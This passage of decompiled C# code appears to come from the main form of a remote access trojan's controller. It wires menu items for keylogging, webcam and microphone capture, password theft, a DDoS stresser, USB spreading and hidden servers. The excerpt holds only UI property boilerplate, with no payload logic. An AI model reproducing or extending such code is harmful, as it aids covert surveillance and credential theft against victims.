			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox7 = value;
			}
		}

		// Token: 0x170000DA RID: 218
		// (get) Token: 0x060001E0 RID: 480 RVA: 0x000168E4 File Offset: 0x00014AE4
		// (set) Token: 0x060001E1 RID: 481 RVA: 0x00002D5D File Offset: 0x00000F5D
		internal virtual Panel Global_Notes
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Global_Notes;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Global_Notes = value;
			}
		}

		// Token: 0x170000DB RID: 219
		// (get) Token: 0x060001E2 RID: 482 RVA: 0x000168FC File Offset: 0x00014AFC
		// (set) Token: 0x060001E3 RID: 483 RVA: 0x00002D66 File Offset: 0x00000F66
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x170000DC RID: 220
		// (get) Token: 0x060001E4 RID: 484 RVA: 0x00016914 File Offset: 0x00014B14
		// (set) Token: 0x060001E5 RID: 485 RVA: 0x0001692C File Offset: 0x00014B2C
		internal virtual Button Button14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button14_Click);
				if (this._Button14 != null)
				{
					this._Button14.Click -= value2;
				}
				this._Button14 = value;
				if (this._Button14 != null)
				{
					this._Button14.Click += value2;
				}
			}
		}

		// Token: 0x170000DD RID: 221
		// (get) Token: 0x060001E6 RID: 486 RVA: 0x00016984 File Offset: 0x00014B84
		// (set) Token: 0x060001E7 RID: 487 RVA: 0x00002D6F File Offset: 0x00000F6F
		internal virtual ImageList IMG_Flags
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IMG_Flags;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._IMG_Flags = value;
			}
		}

		// Token: 0x170000DE RID: 222
		// (get) Token: 0x060001E8 RID: 488 RVA: 0x0001699C File Offset: 0x00014B9C
		// (set) Token: 0x060001E9 RID: 489 RVA: 0x00002D78 File Offset: 0x00000F78
		internal virtual ColumnHeader ColumnHeader16
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ColumnHeader16;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ColumnHeader16 = value;
			}
		}

		// Token: 0x170000DF RID: 223
		// (get) Token: 0x060001EA RID: 490 RVA: 0x000169B4 File Offset: 0x00014BB4
		// (set) Token: 0x060001EB RID: 491 RVA: 0x00002D81 File Offset: 0x00000F81
		internal virtual ControlAbout ControlAbout1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ControlAbout1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ControlAbout1 = value;
			}
		}

		// Token: 0x170000E0 RID: 224
		// (get) Token: 0x060001EC RID: 492 RVA: 0x000169CC File Offset: 0x00014BCC
		// (set) Token: 0x060001ED RID: 493 RVA: 0x00002D8A File Offset: 0x00000F8A
		internal virtual ImageList ImageList1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ImageList1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ImageList1 = value;
			}
		}

		// Token: 0x170000E1 RID: 225
		// (get) Token: 0x060001EE RID: 494 RVA: 0x000169E4 File Offset: 0x00014BE4
		// (set) Token: 0x060001EF RID: 495 RVA: 0x000169FC File Offset: 0x00014BFC
		internal virtual ToolStripMenuItem EditFileHostToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._EditFileHostToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.EditFileHostToolStripMenuItem_Click);
				if (this._EditFileHostToolStripMenuItem != null)
				{
					this._EditFileHostToolStripMenuItem.Click -= value2;
				}
				this._EditFileHostToolStripMenuItem = value;
				if (this._EditFileHostToolStripMenuItem != null)
				{
					this._EditFileHostToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000E2 RID: 226
		// (get) Token: 0x060001F0 RID: 496 RVA: 0x00016A54 File Offset: 0x00014C54
		// (set) Token: 0x060001F1 RID: 497 RVA: 0x00002D93 File Offset: 0x00000F93
		internal virtual ControlShatroom ControlShatroom1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ControlShatroom1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ControlShatroom1 = value;
			}
		}

		// Token: 0x170000E3 RID: 227
		// (get) Token: 0x060001F2 RID: 498 RVA: 0x00016A6C File Offset: 0x00014C6C
		// (set) Token: 0x060001F3 RID: 499 RVA: 0x00002D9C File Offset: 0x00000F9C
		internal virtual ControlDetector ControlDetector1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ControlDetector1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ControlDetector1 = value;
			}
		}

		// Token: 0x170000E4 RID: 228
		// (get) Token: 0x060001F4 RID: 500 RVA: 0x00016A84 File Offset: 0x00014C84
		// (set) Token: 0x060001F5 RID: 501 RVA: 0x00016A9C File Offset: 0x00014C9C
		internal virtual ToolStripMenuItem KeyloggerToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._KeyloggerToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.KeyloggerToolStripMenuItem1_Click);
				if (this._KeyloggerToolStripMenuItem1 != null)
				{
					this._KeyloggerToolStripMenuItem1.Click -= value2;
				}
				this._KeyloggerToolStripMenuItem1 = value;
				if (this._KeyloggerToolStripMenuItem1 != null)
				{
					this._KeyloggerToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000E5 RID: 229
		// (get) Token: 0x060001F6 RID: 502 RVA: 0x00016AF4 File Offset: 0x00014CF4
		// (set) Token: 0x060001F7 RID: 503 RVA: 0x00002DA5 File Offset: 0x00000FA5
		internal virtual Panel Panel1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Panel1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Panel1 = value;
			}
		}

		// Token: 0x170000E6 RID: 230
		// (get) Token: 0x060001F8 RID: 504 RVA: 0x00016B0C File Offset: 0x00014D0C
		// (set) Token: 0x060001F9 RID: 505 RVA: 0x00016B24 File Offset: 0x00014D24
		internal virtual Button Button12
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button12;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button12_Click);
				if (this._Button12 != null)
				{
					this._Button12.Click -= value2;
				}
				this._Button12 = value;
				if (this._Button12 != null)
				{
					this._Button12.Click += value2;
				}
			}
		}

		// Token: 0x170000E7 RID: 231
		// (get) Token: 0x060001FA RID: 506 RVA: 0x00016B7C File Offset: 0x00014D7C
		// (set) Token: 0x060001FB RID: 507 RVA: 0x00016B94 File Offset: 0x00014D94
		internal virtual ToolStripMenuItem DesktopToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DesktopToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DesktopToolStripMenuItem_Click);
				if (this._DesktopToolStripMenuItem != null)
				{
					this._DesktopToolStripMenuItem.Click -= value2;
				}
				this._DesktopToolStripMenuItem = value;
				if (this._DesktopToolStripMenuItem != null)
				{
					this._DesktopToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000E8 RID: 232
		// (get) Token: 0x060001FC RID: 508 RVA: 0x00016BEC File Offset: 0x00014DEC
		// (set) Token: 0x060001FD RID: 509 RVA: 0x00016C04 File Offset: 0x00014E04
		internal virtual ToolStripMenuItem WebcamToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._WebcamToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.WebcamToolStripMenuItem_Click);
				if (this._WebcamToolStripMenuItem != null)
				{
					this._WebcamToolStripMenuItem.Click -= value2;
				}
				this._WebcamToolStripMenuItem = value;
				if (this._WebcamToolStripMenuItem != null)
				{
					this._WebcamToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000E9 RID: 233
		// (get) Token: 0x060001FE RID: 510 RVA: 0x00016C5C File Offset: 0x00014E5C
		// (set) Token: 0x060001FF RID: 511 RVA: 0x00016C74 File Offset: 0x00014E74
		internal virtual ToolStripMenuItem MicrophoneToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._MicrophoneToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.MicrophoneToolStripMenuItem1_Click);
				if (this._MicrophoneToolStripMenuItem1 != null)
				{
					this._MicrophoneToolStripMenuItem1.Click -= value2;
				}
				this._MicrophoneToolStripMenuItem1 = value;
				if (this._MicrophoneToolStripMenuItem1 != null)
				{
					this._MicrophoneToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000EA RID: 234
		// (get) Token: 0x06000200 RID: 512 RVA: 0x00016CCC File Offset: 0x00014ECC
		// (set) Token: 0x06000201 RID: 513 RVA: 0x00016CE4 File Offset: 0x00014EE4
		internal virtual ToolStripMenuItem ChatToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ChatToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ChatToolStripMenuItem_Click);
				if (this._ChatToolStripMenuItem != null)
				{
					this._ChatToolStripMenuItem.Click -= value2;
				}
				this._ChatToolStripMenuItem = value;
				if (this._ChatToolStripMenuItem != null)
				{
					this._ChatToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EB RID: 235
		// (get) Token: 0x06000202 RID: 514 RVA: 0x00016D3C File Offset: 0x00014F3C
		// (set) Token: 0x06000203 RID: 515 RVA: 0x00016D54 File Offset: 0x00014F54
		internal virtual ToolStripMenuItem GetPasswordToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GetPasswordToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GetPasswordToolStripMenuItem_Click);
				if (this._GetPasswordToolStripMenuItem != null)
				{
					this._GetPasswordToolStripMenuItem.Click -= value2;
				}
				this._GetPasswordToolStripMenuItem = value;
				if (this._GetPasswordToolStripMenuItem != null)
				{
					this._GetPasswordToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000EC RID: 236
		// (get) Token: 0x06000204 RID: 516 RVA: 0x00016DAC File Offset: 0x00014FAC
		// (set) Token: 0x06000205 RID: 517 RVA: 0x00016DC4 File Offset: 0x00014FC4
		internal virtual ToolStripMenuItem DDoSStresserToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._DDoSStresserToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.DDoSStresserToolStripMenuItem1_Click);
				if (this._DDoSStresserToolStripMenuItem1 != null)
				{
					this._DDoSStresserToolStripMenuItem1.Click -= value2;
				}
				this._DDoSStresserToolStripMenuItem1 = value;
				if (this._DDoSStresserToolStripMenuItem1 != null)
				{
					this._DDoSStresserToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000ED RID: 237
		// (get) Token: 0x06000206 RID: 518 RVA: 0x00016E1C File Offset: 0x0001501C
		// (set) Token: 0x06000207 RID: 519 RVA: 0x00016E34 File Offset: 0x00015034
		internal virtual ToolStripMenuItem ToolStripMenuItem5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripMenuItem5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ToolStripMenuItem5_Click);
				if (this._ToolStripMenuItem5 != null)
				{
					this._ToolStripMenuItem5.Click -= value2;
				}
				this._ToolStripMenuItem5 = value;
				if (this._ToolStripMenuItem5 != null)
				{
					this._ToolStripMenuItem5.Click += value2;
				}
			}
		}

		// Token: 0x170000EE RID: 238
		// (get) Token: 0x06000208 RID: 520 RVA: 0x00016E8C File Offset: 0x0001508C
		// (set) Token: 0x06000209 RID: 521 RVA: 0x00016EA4 File Offset: 0x000150A4
		internal virtual ToolStripMenuItem IPLockupToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._IPLockupToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.IPLockupToolStripMenuItem1_Click);
				if (this._IPLockupToolStripMenuItem1 != null)
				{
					this._IPLockupToolStripMenuItem1.Click -= value2;
				}
				this._IPLockupToolStripMenuItem1 = value;
				if (this._IPLockupToolStripMenuItem1 != null)
				{
					this._IPLockupToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000EF RID: 239
		// (get) Token: 0x0600020A RID: 522 RVA: 0x00016EFC File Offset: 0x000150FC
		// (set) Token: 0x0600020B RID: 523 RVA: 0x00016F14 File Offset: 0x00015114
		internal virtual ToolStripMenuItem PluginInformationsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PluginInformationsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.PluginInformationsToolStripMenuItem_Click);
				if (this._PluginInformationsToolStripMenuItem != null)
				{
					this._PluginInformationsToolStripMenuItem.Click -= value2;
				}
				this._PluginInformationsToolStripMenuItem = value;
				if (this._PluginInformationsToolStripMenuItem != null)
				{
					this._PluginInformationsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F0 RID: 240
		// (get) Token: 0x0600020C RID: 524 RVA: 0x00016F6C File Offset: 0x0001516C
		// (set) Token: 0x0600020D RID: 525 RVA: 0x00016F84 File Offset: 0x00015184
		internal virtual ToolStripMenuItem ScriptToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ScriptToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ScriptToolStripMenuItem1_Click);
				if (this._ScriptToolStripMenuItem1 != null)
				{
					this._ScriptToolStripMenuItem1.Click -= value2;
				}
				this._ScriptToolStripMenuItem1 = value;
				if (this._ScriptToolStripMenuItem1 != null)
				{
					this._ScriptToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000F1 RID: 241
		// (get) Token: 0x0600020E RID: 526 RVA: 0x00016FDC File Offset: 0x000151DC
		// (set) Token: 0x0600020F RID: 527 RVA: 0x00016FF4 File Offset: 0x000151F4
		internal virtual ToolStripMenuItem FromDiskToolStripMenuItem3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._FromDiskToolStripMenuItem3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.FromDiskToolStripMenuItem3_Click);
				if (this._FromDiskToolStripMenuItem3 != null)
				{
					this._FromDiskToolStripMenuItem3.Click -= value2;
				}
				this._FromDiskToolStripMenuItem3 = value;
				if (this._FromDiskToolStripMenuItem3 != null)
				{
					this._FromDiskToolStripMenuItem3.Click += value2;
				}
			}
		}

		// Token: 0x170000F2 RID: 242
		// (get) Token: 0x06000210 RID: 528 RVA: 0x0001704C File Offset: 0x0001524C
		// (set) Token: 0x06000211 RID: 529 RVA: 0x00017064 File Offset: 0x00015264
		internal virtual ToolStripMenuItem HiddenServerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._HiddenServerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.HiddenServerToolStripMenuItem_Click);
				if (this._HiddenServerToolStripMenuItem != null)
				{
					this._HiddenServerToolStripMenuItem.Click -= value2;
				}
				this._HiddenServerToolStripMenuItem = value;
				if (this._HiddenServerToolStripMenuItem != null)
				{
					this._HiddenServerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F3 RID: 243
		// (get) Token: 0x06000212 RID: 530 RVA: 0x000170BC File Offset: 0x000152BC
		// (set) Token: 0x06000213 RID: 531 RVA: 0x000170D4 File Offset: 0x000152D4
		internal virtual ToolStripMenuItem InformationsToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._InformationsToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.InformationsToolStripMenuItem1_Click);
				if (this._InformationsToolStripMenuItem1 != null)
				{
					this._InformationsToolStripMenuItem1.Click -= value2;
				}
				this._InformationsToolStripMenuItem1 = value;
				if (this._InformationsToolStripMenuItem1 != null)
				{
					this._InformationsToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000F4 RID: 244
		// (get) Token: 0x06000214 RID: 532 RVA: 0x0001712C File Offset: 0x0001532C
		// (set) Token: 0x06000215 RID: 533 RVA: 0x00017144 File Offset: 0x00015344
		internal virtual ToolStripMenuItem SellectAllServersToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SellectAllServersToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SellectAllServersToolStripMenuItem_Click);
				if (this._SellectAllServersToolStripMenuItem != null)
				{
					this._SellectAllServersToolStripMenuItem.Click -= value2;
				}
				this._SellectAllServersToolStripMenuItem = value;
				if (this._SellectAllServersToolStripMenuItem != null)
				{
					this._SellectAllServersToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F5 RID: 245
		// (get) Token: 0x06000216 RID: 534 RVA: 0x0001719C File Offset: 0x0001539C
		// (set) Token: 0x06000217 RID: 535 RVA: 0x000171B4 File Offset: 0x000153B4
		internal virtual ToolStripMenuItem CopyIPAddressToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._CopyIPAddressToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.CopyIPAddressToolStripMenuItem1_Click);
				if (this._CopyIPAddressToolStripMenuItem1 != null)
				{
					this._CopyIPAddressToolStripMenuItem1.Click -= value2;
				}
				this._CopyIPAddressToolStripMenuItem1 = value;
				if (this._CopyIPAddressToolStripMenuItem1 != null)
				{
					this._CopyIPAddressToolStripMenuItem1.Click += value2;
				}
			}
		}

		// Token: 0x170000F6 RID: 246
		// (get) Token: 0x06000218 RID: 536 RVA: 0x0001720C File Offset: 0x0001540C
		// (set) Token: 0x06000219 RID: 537 RVA: 0x00002DAE File Offset: 0x00000FAE
		internal virtual ToolStripSeparator AToolStripMenuItem1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AToolStripMenuItem1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AToolStripMenuItem1 = value;
			}
		}

		// Token: 0x170000F7 RID: 247
		// (get) Token: 0x0600021A RID: 538 RVA: 0x00017224 File Offset: 0x00015424
		// (set) Token: 0x0600021B RID: 539 RVA: 0x0001723C File Offset: 0x0001543C
		internal virtual ToolStripMenuItem ClearAllPluginsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ClearAllPluginsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ClearAllPluginsToolStripMenuItem_Click);
				if (this._ClearAllPluginsToolStripMenuItem != null)
				{
					this._ClearAllPluginsToolStripMenuItem.Click -= value2;
				}
				this._ClearAllPluginsToolStripMenuItem = value;
				if (this._ClearAllPluginsToolStripMenuItem != null)
				{
					this._ClearAllPluginsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000F8 RID: 248
		// (get) Token: 0x0600021C RID: 540 RVA: 0x00017294 File Offset: 0x00015494
		// (set) Token: 0x0600021D RID: 541 RVA: 0x00002DB7 File Offset: 0x00000FB7
		internal virtual ToolStripSeparator AToolStripMenuItem2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AToolStripMenuItem2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._AToolStripMenuItem2 = value;
			}
		}

		// Token: 0x170000F9 RID: 249
		// (get) Token: 0x0600021E RID: 542 RVA: 0x000172AC File Offset: 0x000154AC
		// (set) Token: 0x0600021F RID: 543 RVA: 0x000172C4 File Offset: 0x000154C4
		internal virtual ToolStripMenuItem AntiProcessHackerToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._AntiProcessHackerToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.AntiProcessHackerToolStripMenuItem_Click);
				if (this._AntiProcessHackerToolStripMenuItem != null)
				{
					this._AntiProcessHackerToolStripMenuItem.Click -= value2;
				}
				this._AntiProcessHackerToolStripMenuItem = value;
				if (this._AntiProcessHackerToolStripMenuItem != null)
				{
					this._AntiProcessHackerToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000FA RID: 250
		// (get) Token: 0x06000220 RID: 544 RVA: 0x0001731C File Offset: 0x0001551C
		// (set) Token: 0x06000221 RID: 545 RVA: 0x00017334 File Offset: 0x00015534
		internal virtual NotifyIcon NotifyIcon1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NotifyIcon1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.NotifyIcon1_Click);
				if (this._NotifyIcon1 != null)
				{
					this._NotifyIcon1.Click -= value2;
				}
				this._NotifyIcon1 = value;
				if (this._NotifyIcon1 != null)
				{
					this._NotifyIcon1.Click += value2;
				}
			}
		}

		// Token: 0x170000FB RID: 251
		// (get) Token: 0x06000222 RID: 546 RVA: 0x0001738C File Offset: 0x0001558C
		// (set) Token: 0x06000223 RID: 547 RVA: 0x00002DC0 File Offset: 0x00000FC0
		internal virtual ContextMenuStrip NotifMenu
		{
			[DebuggerNonUserCode]
			get
			{
				return this._NotifMenu;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._NotifMenu = value;
			}
		}

		// Token: 0x170000FC RID: 252
		// (get) Token: 0x06000224 RID: 548 RVA: 0x000173A4 File Offset: 0x000155A4
		// (set) Token: 0x06000225 RID: 549 RVA: 0x000173BC File Offset: 0x000155BC
		internal virtual ToolStripMenuItem ShowToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ShowToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ShowToolStripMenuItem_Click);
				if (this._ShowToolStripMenuItem != null)
				{
					this._ShowToolStripMenuItem.Click -= value2;
				}
				this._ShowToolStripMenuItem = value;
				if (this._ShowToolStripMenuItem != null)
				{
					this._ShowToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000FD RID: 253
		// (get) Token: 0x06000226 RID: 550 RVA: 0x00017414 File Offset: 0x00015614
		// (set) Token: 0x06000227 RID: 551 RVA: 0x0001742C File Offset: 0x0001562C
		internal virtual ToolStripMenuItem ExitToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ExitToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ExitToolStripMenuItem_Click);
				if (this._ExitToolStripMenuItem != null)
				{
					this._ExitToolStripMenuItem.Click -= value2;
				}
				this._ExitToolStripMenuItem = value;
				if (this._ExitToolStripMenuItem != null)
				{
					this._ExitToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x170000FE RID: 254
		// (get) Token: 0x06000228 RID: 552 RVA: 0x00017484 File Offset: 0x00015684
		// (set) Token: 0x06000229 RID: 553 RVA: 0x00002DC9 File Offset: 0x00000FC9
		internal virtual CheckBox SC1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SC1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._SC1 = value;
			}
		}

		// Token: 0x170000FF RID: 255
		// (get) Token: 0x0600022A RID: 554 RVA: 0x0001749C File Offset: 0x0001569C
		// (set) Token: 0x0600022B RID: 555 RVA: 0x000174B4 File Offset: 0x000156B4
		internal virtual ToolStripMenuItem UsbSpreadsToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._UsbSpreadsToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.UsbSpreadsToolStripMenuItem_Click);
				if (this._UsbSpreadsToolStripMenuItem != null)
				{
					this._UsbSpreadsToolStripMenuItem.Click -= value2;
				}
				this._UsbSpreadsToolStripMenuItem = value;
				if (this._UsbSpreadsToolStripMenuItem != null)
				{
					this._UsbSpreadsToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000100 RID: 256
		// (get) Token: 0x0600022C RID: 556 RVA: 0x0001750C File Offset: 0x0001570C
		// (set) Token: 0x0600022D RID: 557 RVA: 0x00002DD2 File Offset: 0x00000FD2
		internal virtual ToolStripSeparator ToolStripSeparator5
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator5;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator5 = value;
			}
		}

		// Token: 0x17000101 RID: 257
		// (get) Token: 0x0600022E RID: 558 RVA: 0x00017524 File Offset: 0x00015724
		// (set) Token: 0x0600022F RID: 559 RVA: 0x00002DDB File Offset: 0x00000FDB
		internal virtual ToolStripSeparator ToolStripSeparator7
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator7;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator7 = value;
			}
		}

		// Token: 0x17000102 RID: 258
		// (get) Token: 0x06000230 RID: 560 RVA: 0x0001753C File Offset: 0x0001573C
		// (set) Token: 0x06000231 RID: 561 RVA: 0x00002DE4 File Offset: 0x00000FE4
		internal virtual ToolStripSeparator ToolStripSeparator8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator8 = value;
			}
		}

		// Token: 0x17000103 RID: 259
		// (get) Token: 0x06000232 RID: 562 RVA: 0x00017554 File Offset: 0x00015754
		// (set) Token: 0x06000233 RID: 563 RVA: 0x00002DED File Offset: 0x00000FED
		internal virtual ToolStripSeparator ToolStripSeparator6
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSeparator6;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSeparator6 = value;
			}
		}

		// Token: 0x17000104 RID: 260
		// (get) Token: 0x06000234 RID: 564 RVA: 0x0001756C File Offset: 0x0001576C
		// (set) Token: 0x06000235 RID: 565 RVA: 0x00002DF6 File Offset: 0x00000FF6
		internal virtual Label sl
		{
			[DebuggerNonUserCode]
			get
			{
				return this._sl;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._sl = value;
			}
		}

		// Token: 0x17000105 RID: 261
		// (get) Token: 0x06000236 RID: 566 RVA: 0x00017584 File Offset: 0x00015784
		// (set) Token: 0x06000237 RID: 567 RVA: 0x00002DFF File Offset: 0x00000FFF
		internal virtual Label Label19
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label19;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label19 = value;
			}
		}

		// Token: 0x17000106 RID: 262
		// (get) Token: 0x06000238 RID: 568 RVA: 0x0001759C File Offset: 0x0001579C
		// (set) Token: 0x06000239 RID: 569 RVA: 0x00002E08 File Offset: 0x00001008
		internal virtual ControNe ControNe1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ControNe1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
